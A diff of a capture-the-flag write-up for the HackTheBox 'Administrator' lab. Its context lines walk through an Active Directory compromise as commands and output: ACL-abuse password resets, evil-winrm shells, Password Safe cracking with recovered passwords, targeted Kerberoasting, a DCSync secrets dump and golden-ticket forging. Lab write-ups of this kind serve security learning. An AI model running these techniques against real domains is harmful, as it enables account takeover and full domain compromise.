@@ -7,8 +7,8 @@ Difficulty: Medium
 
 ### Recon
 ```Bash
-[us-vip-2][10.10.14.29][gntsqid@htb-anpw9jgddd][~]
- []$ nmap -p- -T5 --open -sV 10.10.11.42
+┌─[us-vip-2]─[10.10.14.29]─[gntsqid@htb-anpw9jgddd]─[~]
+└──╼ [★]$ nmap -p- -T5 --open -sV 10.10.11.42
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 17:58 CST
 Nmap scan report for administrator.htb (10.10.11.42)
 Host is up (0.066s latency).
@@ -46,8 +46,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 76.22 seconds
 ```
 ```Bash
-[us-vip-2][10.10.14.29][gntsqid@htb-anpw9jgddd][~]
- []$ rpcclient -U 'olivia%ichliebedich' 10.10.11.42
+┌─[us-vip-2]─[10.10.14.29]─[gntsqid@htb-anpw9jgddd]─[~]
+└──╼ [★]$ rpcclient -U 'olivia%ichliebedich' 10.10.11.42
 rpcclient $> queryuser olivia
 	User Name   :	olivia
 	Full Name   :	Olivia Johnson
@@ -123,14 +123,14 @@ rhosts => 10.10.11.42
 ```
 alternatively:
 ```Bash
-[us-vip-2][10.10.14.29][gntsqid@htb-anpw9jgddd][~]
- []$ nc -v 10.10.11.42 21
+┌─[us-vip-2]─[10.10.14.29]─[gntsqid@htb-anpw9jgddd]─[~]
+└──╼ [★]$ nc -v 10.10.11.42 21
 administrator.htb [10.10.11.42] 21 (ftp) open
 220 Microsoft FTP Service
 ```
 ```Bash
-[us-vip-2][10.10.14.29][gntsqid@htb-anpw9jgddd][~]
- []$ smbmap -u 'olivia' -p 'ichliebedich' -H 10.10.11.42 -d administrator.htb
+┌─[us-vip-2]─[10.10.14.29]─[gntsqid@htb-anpw9jgddd]─[~]
+└──╼ [★]$ smbmap -u 'olivia' -p 'ichliebedich' -H 10.10.11.42 -d administrator.htb
 [+] IP: 10.10.11.42:445	Name: administrator.htb                                 
         Disk                                                  	Permissions	Comment
 	----                                                  	-----------	-------
@@ -255,8 +255,8 @@ Host script results:
 
 > THE HASH GRAB FAILED SO JUAN PASSED IT TO ME
 ```Bash
-[us-vip-2][10.10.14.29][gntsqid@htb-anpw9jgddd][~]
- []$ hashcat --identify hash 
+┌─[us-vip-2]─[10.10.14.29]─[gntsqid@htb-anpw9jgddd]─[~]
+└──╼ [★]$ hashcat --identify hash 
 The following hash-mode match the structure of your input hash:
 
       # | Name                                                       | Category
@@ -280,30 +280,47 @@ bloodhound-python -u olivia -p 'ichliebedich' -d administrator.htb -c all -dc ad
 ```
 
 
-
 > FINALLY GOT BLOODHOUND TO WORK, AM USING PIHOLE AS DNS
 
-[screenshot]
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/aa8a617c-df25-410f-a07e-4373e7416afd) returned 404 during the image audit (2026-10-08).
+
 
 Using *shortest path to domain admins*\
-[screenshot]\
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/7f3f9b70-1f43-49fa-9cee-efc031755ba1) returned 404 during the image audit (2026-10-08).
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/96911f0e-b8bb-4731-ab9a-42d35b4e25ca) returned 404 during the image audit (2026-10-08).
+
 
 > tip: press *CTRL* to cycle through labels to see all
->> [screenshot]
+>>
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/67efca54-42e5-4760-aa3a-664d947db2b2) returned 404 during the image audit (2026-10-08).
+
 
 lets search for *group:Admin* and do shortest path to it\
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/4b80c5f4-df20-40a0-aa2d-7c8cf1e1a953) returned 404 during the image audit (2026-10-08).
+
 
 > **IGNORE ABOVE**
 
 We want to do pathfinding from our user olivia to other users.\
 Let's check out Michael.\
 Enter Olivia's name in the search and do the little road icon for pathfinding followed by entering michael's name\
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/afa8aebe-6a88-41a6-8bf9-e7c5ca3a62aa) returned 404 during the image audit (2026-10-08).
+
 
 We can right-click and see that Olivia has *GenericAll* rights to Michael:\
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/44352fa7-c7a8-4e50-880e-3e2b2944006f) returned 404 during the image audit (2026-10-08).
+
 
 This means olivia can overwrite stuff on michael's account like say....a password...\
 Why care about this? **Michael has GenericAll to the *Domain Admins* group!**
@@ -316,13 +333,13 @@ bloodyAD --host 10.10.11.42 -d administrator.htb -u olivia -p ichliebedich set p
 pip3 install --upgrade msldap
 ```
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound]
-$ bloodyAD --host 10.10.11.42 -d administrator.htb -u olivia -p ichliebedich set password 'MICHAEL' 'NetSecWasHere!'
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound]
+└─$ bloodyAD --host 10.10.11.42 -d administrator.htb -u olivia -p ichliebedich set password 'MICHAEL' 'NetSecWasHere!'
 [+] Password changed successfully!
 ```
 ```PowerShell
-(kalikali)-[~/Desktop/admin-bloodhound]
-$ evil-winrm -i administrator.htb -u 'administrator\michael' -p 'NetSecWasHere!'
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound]
+└─$ evil-winrm -i administrator.htb -u 'administrator\michael' -p 'NetSecWasHere!'
                                         
 Evil-WinRM shell v3.5
                                         
@@ -376,17 +393,22 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
 **Juan Suggests** I lok into the user Benjamin next:\
-[screenshot]\
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/50a71b4f-b486-4e77-8304-e0700a215355) returned 404 during the image audit (2026-10-08).
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/0d7e4603-d5c0-48ee-ba76-cdcf72f14df7) returned 404 during the image audit (2026-10-08).
+
 
 > It would appear we want to FTP as him
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound]
-$ bloodyAD --host 10.10.11.42 -d administrator.htb -u michael -p 'NetSecWasHere!' set password 'BENJAMIN' 'NetSecWasHere!' 
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound]
+└─$ bloodyAD --host 10.10.11.42 -d administrator.htb -u michael -p 'NetSecWasHere!' set password 'BENJAMIN' 'NetSecWasHere!' 
 [+] Password changed successfully!
                                                                                                                                                             
-(kalikali)-[~/Desktop/admin-bloodhound]
-$ ftp benjamin@10.10.11.42
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound]
+└─$ ftp benjamin@10.10.11.42
 Connected to 10.10.11.42.
 220 Microsoft FTP Service
 331 Password required
@@ -412,18 +434,18 @@ File may not have transferred correctly.
 952 bytes received in 00:00 (3.36 KiB/s)
 ```
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ ls
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ ls
 Backup.psafe3
                                                                                                                                                             
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ file Backup.psafe3      
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ file Backup.psafe3      
 Backup.psafe3: Password Safe V3 database
 ```
 Let's check this out with hashcat.
 ```Bash                                                                                                                                                            
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ hashcat -h | grep -i safe                  
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ hashcat -h | grep -i safe                  
    9000 | Password Safe v2                                           | Password Manager
    5200 | Password Safe v3                                           | Password Manager
 ```
@@ -431,12 +453,15 @@ It is password safe, so lets continue:
 ```Bash
 sudo apt install pwsafe
 ```
-[screenshot]
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/62a2606a-5408-4123-b1e9-6b4e549ff9d7) returned 404 during the image audit (2026-10-08).
+
 
 We don't know the password, so let's crack it!
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ hashcat --identify Backup.psafe3 
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ hashcat --identify Backup.psafe3 
 The following 37 hash-modes match the structure of your input hash:
 
       # | Name                                                       | Category
@@ -484,9 +509,15 @@ hashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlists/rockyou.txt
 ```
 > My VM sucks at running hashcat, so taking Juan's loot
 >> Password is *tekieromucho*
->> [screenshot]
+>>
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/6f1649f5-58b2-40b7-9c96-1b64310b9957) returned 404 during the image audit (2026-10-08).
 
-[screenshot][screenshot]# 
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/c1745359-6681-4c9d-83d2-5e005a8233a8) returned 404 during the image audit (2026-10-08).
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/1ec5c317-2feb-4cc9-9b37-09c55bb3444f) returned 404 during the image audit (2026-10-08).
+
 
 Double click to get copy the passwords to clipboard:
 - alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
@@ -496,8 +527,8 @@ Double click to get copy the passwords to clipboard:
 
 Let us try *emily* first:
 ```PowerShell
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ evil-winrm -i administrator.htb -u 'administrator\emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ evil-winrm -i administrator.htb -u 'administrator\emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
                                         
 Evil-WinRM shell v3.5
                                         
@@ -528,14 +559,14 @@ d716c4b869d28ed4902e9d868351bc5a
 If we were to check bloodhound better, we should see *according to Juan* that user *ethan* has *DCSync* permissions, so let's abuse those.\
 Sterben reminder: look up what DCSync is again....
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ bloodyAD --host 10.10.11.42 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object "CN=ETHAN HUNT,CN=USERS,DC=ADMINISTRATOR,DC=HTB" servicePrincipalName -v 'evil/ethan'
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ bloodyAD --host 10.10.11.42 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object "CN=ETHAN HUNT,CN=USERS,DC=ADMINISTRATOR,DC=HTB" servicePrincipalName -v 'evil/ethan'
 [+] CN=ETHAN HUNT,CN=USERS,DC=ADMINISTRATOR,DC=HTB's servicePrincipalName has been updated
 ```
 verify:
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ impacket-GetUserSPNs administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.10.11.42
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ impacket-GetUserSPNs administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.10.11.42
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation 
@@ -544,14 +575,13 @@ evil/ethan            ethan            2024-10-12 16:52:14.117811  <never>
 ```
 Now we get a kerberos ticket:
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ faketime 'now + 7 hours' impacket-GetUserSPNs administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.10.11.42 -request
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ faketime 'now + 7 hours' impacket-GetUserSPNs administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.10.11.42 -request
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation 
 --------------------  -----  --------  --------------------------  ---------  ----------
 evil/ethan            ethan            2024-10-12 16:52:14.117811  <never>               
-
 
 
 [-] CCache file is not found. Skipping...
@@ -562,8 +592,8 @@ ticket hash  alone:
 $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$dd0354bb7c0d18d35d75280c7de18f96$db0cde1a314ec8713aaeca363fe95435ea30c7d86c5cd9e7bc035743aa574c3fc4870148e7e899b73e3a55b9eb4648c88adb4b1cc05ad864074697412d3b2291e5963686b50757dc175f7273e2359dd9b90b36e8c5feccb0f62dff8993f9dac3cb750c2080855916433d17b01de78b8b9ce5d7d4f74588f3726198d69fba6bc5b47b0267500460996ccfd7e23b067d18b16757d295350277c5b56888ffbec93f22d0fe937e0d73861a08941a45a6db0e2c4645a66edb901c8492c1910201820ceb714f0b2e2c83a1f86f7cbbf11d25dccf7c1bbacdec025ee56e5836f0f2898c2ff812f3be5fd6d725c5e78257ac03fcec1a7e11f15b420ba0caa045b4b061cf5bd86f8d0fb3ed9c7c719f213e60e2db0594471e0323d0a55705a51fd0b59d80aac808956b0419e794c38f72a4f112cb07eca75a56382d87fa8de256c6d283685b690e7285b27ae39ba618760e13d78443d79872eb1fd350ee8215e18a98d8bb50cfbcda4107f853673ed49b9eb943126629e4466300423214394bd8d93085de2675558f4aaadb2aa65e9b2a49e5bc6e7bf7856b0edd4c7d559c457a17862af112192c5ad67ea3ba2e478e63089dfbd1c523740aebbd9f26ced21eb7f0aab3da940510abeaef6cd6b6d09864e076c9b9e60ea52ec2a52023e51874281fd820f2e6f9fa5543c00d46f94f41ea2afdadefde6a95d627e3eb27a8417f5bcbc3afd093aa5fce1e97c180eaca9b063a5369f7e256c7b2aea0ca3056fe8992c5b3da2eab0a00584efa8d20bcd47768d7d5631ee26908be0110af2d8bcf21b98fb22cbd606cf7f694e8c4d5a4ea8a7cc6b1f5f0306066a7d33fe45a5e65aa78df69c1498f1676f029cf62ee87bb3c9d85e626191dec4199f4259022dd67f1eac49a0523f4690fc812472bdc95df8663b9f1a7c2b36d23f06d627003e8320987ddcac866a2941fd1b672c256af522d8412286bcc07f3f4ca3bcb2c6fb87e67faef8314cbcb654c6ece1d272929b7f5ae3ba2d112acd2a9a89a58e1183fbfc2fe77aa6386e354526fdc493f4dc7bffec13541ff92b4d6f197202ac42600869acb23631c88c3bcec945f7a4261e84c763503affa2691df30373e145c00b4fc10d1df6973beb39c12e643f8c5e4c500b387f43e248153fd7704509b4971e9371b3b04d23a18ad3aeaf29827ea69495ae47f3d221e93e785630d5ea1cb0c8c4feda24166c22f69b17f8df1cd09d623e07d509970e62cbc9074537999ebe3ef912356c044c6e50a90a0bf0d0e89e7571a4b177ff04a5dc777baee267b91b988b7f5ad99b75b59a9ebfa690f8ae35473bd3191eba75a4674a1612eb2fa1c24c4bb4067895e3b5ff9fa91ad5022b527ce84bce9e1c816761ad906253f352dcf31f522b52b53c796a4b5c273b8c9994d6723a3074a2c15d842710a9860d78bcee0ac7597497d0946cb2aa662850b8168080870bcc6863faf69807e6262600b2e4db88235b26a992508ee21dce6dce7d5bb9a798dffe659192860a640e1be9997fdc572b0804e5c
 ```
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ hashcat --identify hash                                            
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ hashcat --identify hash                                            
 The following hash-mode match the structure of your input hash:
 
       # | Name                                                       | Category
@@ -581,8 +611,8 @@ faketime 'now + 7 hours' ./targetedKerberoast.py -d administrator.htb -u emily -
 
 Time to DCSync with Ethan:
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ impacket-secretsdump administrator.htb/ethan:'limpbizkit'@10.10.11.42                                   
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ impacket-secretsdump administrator.htb/ethan:'limpbizkit'@10.10.11.42                                   
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
@@ -634,13 +664,17 @@ DC$:des-cbc-md5:f483547c4325492a
 ```
 Something something we have golden tickets?\
 remind me to ask Juan\
-[screenshot]\
+
+
+> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/edc5ac56-3eea-4614-8fd2-6142125eb998) returned 404 during the image audit (2026-10-08).
+
+
 it looks like the important line from above is: *krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::*
 
 We need *ticketer.py*. 
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ impacket-ticketer                                                    
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ impacket-ticketer                                                    
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 usage: ticketer.py [-h] [-spn SPN] [-request] -domain DOMAIN -domain-sid DOMAIN_SID [-aesKey hex key] [-nthash NTHASH] [-keytab KEYTAB] [-groups GROUPS]
@@ -695,8 +729,8 @@ Examples:
         and saved as baduser.ccache
 ```
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ impacket-ticketer -domain-sid S-1-5-21-1088858960-373806567-2541894 -domain administrator.htb -nthash 1181ba47d45fa2c76385a82409cbfaf6 -user administrator administrator
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ impacket-ticketer -domain-sid S-1-5-21-1088858960-373806567-2541894 -domain administrator.htb -nthash 1181ba47d45fa2c76385a82409cbfaf6 -user administrator administrator
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Creating basic skeleton ticket and PAC Infos
@@ -713,37 +747,37 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Saving ticket in administrator.ccache
 ```
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ ls
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ ls
 administrator.ccache  Backup.psafe3  hash
                                                                                                                                                             
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ file administrator.ccache                                                                                                        
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ file administrator.ccache                                                                                                        
 administrator.ccache: data
                                                                                                                                                             
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ cat administrator.ccache 
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ cat administrator.ccache 
 
-administratorADMINISTRATOR.HTBkrbtgtADMINISTRATOR.HTBUZDIOVdFFaoAVJDkgMgMz`Pz`PP#a0DMINISTRATOR.HTB&0$0rbtgtDMINISTRATOR.HTB0Ѡ}uIA]+wBOW0FqyڍfoLP
-                              yӐnwơL&sD-8ПA({:^`E=`ΦT\11u~B1>LnPP8 zn
-                                                                                                     seϑLYSIzqc|5^:ӱmbT*dΧ߿Ug܉h=y389GdB؊~b6
- 0CsPeEWek=           =mb>
-        {\hl
-               ;BռX&dVF,olů=K<vЦjI,ZRS&o#1L\$ԗcj\XPdpthMy
-                                                                                                                  :8XlWf`Wh'atu|U+Oj,igT·vPqj`#VU:=n%
-                    e.W4eFL_}w:=}=\Oev,h/9L&YlMH[ G2\h޽5&y_Bd[ZFYO
-                                                                                                                        %2~lMcDw
-"-rjmGA$v.Y18       CG"@rѐ1yД>K
-                                                                         u`(x"       p
-7:-leAG$lD/3ך+In)UC[P!I+#&QCטW:v&Bczjԯ9&yO'6<Y
-#qL
+administratorADMINISTRATOR.HTBkrbtgtADMINISTRATOR.HTBUZDIOVdFFaoAVJDkg�M�g�M�z`P�z`P�P�#a�0��DMINISTRATOR.HTB�&0$��0rbtgtDMINISTRATOR.HTB���0�Ѡ��������}���u�I��A�]+wBO�W�0�Fqy���ڍf�o�LP�
+                              yӐ������nw�ơL&�sD�-8П�A���(��{:��^`E=�`Φ�T�\11u�~��B��1>Ln�PP8���� �z�n�
+                                                                                                     ��seϑL�Y��▒S���Iz�q�c|��5^���:�流���ӱ�m���b��T�*����d����Χ߿�U�g�܉h=y�389�G�dB����؊~�b��6��
+��� 0C�sPe�E�����W▒e��k=           ���=������mb�>�
+        ��{\h�l
+               ����;B��▒�ռX����&��d��VF,��▒o��l�������ů�=�K<�vЦ�j�I����,ZRS�&�o#1���L\���$ԗc��j�\��X��Pd�pth�M�y��
+                                                                                                                  :8XlW�����f`�Wh�'�atu�|�U+O�j�,ig��T��·v��Pq�j`�#�VU���:=n���%
+                    ��e�.�W4���e��FL_�}w�:=}���=��\O�ev�,���h/9���L&��Yl��M����▒H�����[� ����G2\h޽5&y_�Bd[����ZF�����YO�
+                                                                                                                        %�2��~l�Mc�Dw
+�"-rjmGA$����v.���Y����18       �C���G"@�rѐ�▒1��������y������Д���>K▒�����
+                                                                         u�`�(x"�       ��p
+7:��-l�e�A������G��$lD�/3��ך��+In����)U������C[���P���!I����+�#��&���QCט��W:v��&��B�c�zjԯ�9�&y�O'�6�<���Y
+#�q���L����
 ```
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ sudo apt install krb5-user
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ sudo apt install krb5-user
 
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ klist -c administrator.ccache
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ klist -c administrator.ccache
 
 Ticket cache: FILE:administrator.ccache
 Default principal: administrator@ADMINISTRATOR.HTB
@@ -753,58 +787,12 @@ Valid starting       Expires              Service principal
         renew until 01/23/2035 04:40:07
 ```
 ```Bash
-(kalikali)-[~/Desktop/admin-bloodhound/admin-ftp]
-$ sudo ntpdate -q 10.10.11.42  
+┌──(kali㉿kali)-[~/Desktop/admin-bloodhound/admin-ftp]
+└─$ sudo ntpdate -q 10.10.11.42  
 
 2025-01-25 04:42:24.909616 (-0500) +10.671326 +/- 0.044663 10.10.11.42 s1 no-leap
 ```
 
 > **TODO** *ASK JUAN HOW TO CONTINUE*
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
